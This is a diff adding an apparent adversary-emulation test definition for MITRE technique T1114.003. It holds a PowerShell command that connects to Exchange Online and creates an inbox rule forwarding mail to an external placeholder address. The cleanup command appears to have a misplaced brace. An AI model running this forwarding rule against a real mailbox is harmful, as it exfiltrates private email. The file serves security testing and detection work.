@@ -1,0 +1,27 @@
+---
+- id: e947c2f5e248a8bbfe0e26b5bf688109
+  name: Office365 - Email Forwarding
+  description: 'Creates a new Inbox Rule to forward emails to an external user via
+    the "ForwardTo" property of the New-InboxRule Powershell cmdlet.
+
+    '
+  tactic: collection
+  technique:
+    attack_id: T1114.003
+    name: 'Email Collection: Email Forwarding Rule'
+  platforms:
+    unknown:
+      psh:
+        command: $secure_pwd = "None" | ConvertTo-SecureString -AsPlainText -Force;
+          $creds = New-Object System.Management.Automation.PSCredential -ArgumentList
+          "None", $secure_pwd; Connect-ExchangeOnline -Credential $creds; New-InboxRule
+          -Name "Atomic Red Team Email Rule" -ForwardTo "Atomic_Operator@fakeemail.aq"
+        payloads: []
+        cleanup: $secure_pwd = "None" | ConvertTo-SecureString -AsPlainText -Force;
+          $creds = New-Object System.Management.Automation.PSCredential -ArgumentList
+          "None", $secure_pwd; Connect-ExchangeOnline -Credential $creds; Get-InboxRule
+          | Where-Object { $_.Name -eq "Atomic Red Team Email Rule" | ForEach-Object
+          { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
